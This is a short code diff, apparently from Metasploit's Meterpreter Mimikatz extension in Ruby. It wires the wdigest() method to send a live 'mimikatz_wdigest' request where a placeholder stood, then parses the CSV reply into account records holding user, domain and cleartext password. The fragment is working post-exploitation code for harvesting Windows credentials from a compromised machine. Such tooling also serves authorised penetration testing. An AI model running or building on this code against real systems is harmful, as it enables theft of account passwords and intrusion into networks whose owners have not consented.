@@ -16,8 +16,10 @@ module Mimikatz
 # exploitation.
 #
 ###
-class Mimikatz < Extension
 
+require 'csv'
+
+class Mimikatz < Extension
 
 	def initialize(client)
 		super(client, 'mimikatz')
@@ -32,8 +34,23 @@ class Mimikatz < Extension
 	end
 
 	def wdigest()
-		request = Packet.create_request('boiler')#'mimikatz_wdigest')
+		request = Packet.create_request('mimikatz_wdigest')
 		response = client.send_request(request)
+		result = Rex::Text.to_ascii(response.get_tlv_value(TLV_TYPE_MIMIKATZ_RESULT))
+	
+		details = CSV.parse(result)
+		accounts  =  []
+		details.each do |acc|
+			account = { 
+				:authid => acc[0],
+				:package => acc[1],
+				:user => acc[2],
+				:domain => acc[3],
+				:password => acc[4]
+			}
+			accounts << account	
+		end
+		return accounts
 	end	
 
 end
